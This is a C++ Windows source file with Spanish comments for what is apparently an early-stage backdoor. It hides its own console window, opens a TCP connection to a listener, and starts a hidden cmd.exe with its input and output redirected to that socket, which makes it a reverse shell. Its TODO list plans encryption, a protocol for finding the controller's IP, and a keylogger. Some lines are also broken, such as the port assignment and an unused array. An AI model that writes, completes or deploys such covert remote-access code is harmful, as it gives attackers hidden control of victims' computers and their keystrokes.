#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#include <cstring>
#pragma comment(lib, "Ws2_32.lib")

#define port "28129"

// TODO: Mover todas las funciones y errores a otros archivos
// TODO: hacer Cleanup
// TODO: Arreglar el tema de que se cierra la conexion cuando sale

void error(const char *message, int type)
{
    std::cerr << "ERROR " << message << " WITH CODE " << type << std::endl;
    std::cin.get();
    exit(-1);
}

SOCKET connect_server()
{
    SOCKET server_socket = INVALID_SOCKET;
    struct addrinfo address_info;
    struct addrinfo *result;
    ZeroMemory(&address_info, sizeof(address_info));
    address_info.ai_protocol = IPPROTO_TCP;
    address_info.ai_family = AF_UNSPEC;
    address_info.ai_socktype = SOCK_STREAM;
    int r = getaddrinfo("127.0.0.1", port, &address_info, &result);
    if (r != 0)
    {
        error("no se pudo obtener datos de localhost", WSAGetLastError());
    }
    for (struct addrinfo *device = result; device != NULL; device = device->ai_next)
    {
        server_socket = WSASocketW(device->ai_family, device->ai_socktype, device->ai_protocol, NULL, (unsigned int)NULL, (unsigned int)NULL);
        //server_socket = socket(device->ai_family, device->ai_socktype, device->ai_protocol);
        if (server_socket == INVALID_SOCKET)
        {
            error("no se pudo conectar con un dispositivo en localhost", WSAGetLastError());
        }
        struct sockaddr_in hx;
        hx.sin_family = AF_INET;
        hx.sin_port = (char)port;
        char str[(int)device -> ai_addrlen];
        hx.sin_addr.s_addr = (char)device -> ai_addr;
        r = WSAConnect(server_socket, device->ai_addr, (int)device->ai_addrlen, NULL, NULL, NULL, NULL);
        if (r == SOCKET_ERROR)
        {
            closesocket(server_socket);
            server_socket = INVALID_SOCKET;
        }
        else
        {
            break;
        }
    }
    freeaddrinfo(result);
    return server_socket;
}

int main()
{
    //Ocultar la consola
    ::ShowWindow(::GetConsoleWindow(),SW_HIDE);

    WSADATA wsadta;
    SOCKET server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Inicia el dll de winsock
    WSAStartup(MAKEWORD(2, 2), &wsadta);
    server = connect_server();
    if (server == INVALID_SOCKET)
    {
        error("no hay nada al cual conectarse", WSAGetLastError());
    }
    if (!send(server,"conectao",sizeof("conectao"),NULL)){
        error("no se pudo enviar el mensaje",WSAGetLastError());
    }
    ZeroMemory(&si,sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)server;
    if (!CreateProcess(NULL, (LPSTR) "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        std::cout << "Errorsito" << std::endl;
    }
    // TODO: Archivos
    // TODO: Prioridad
    // TODO: Encriptacion
    // TODO: Backend (Remplazar Ncat)
    // TODO: Protocolo (GET tcp TODOS, Si hay respuesta, conectarse a esa IP)
    // TODO: Keylogger
}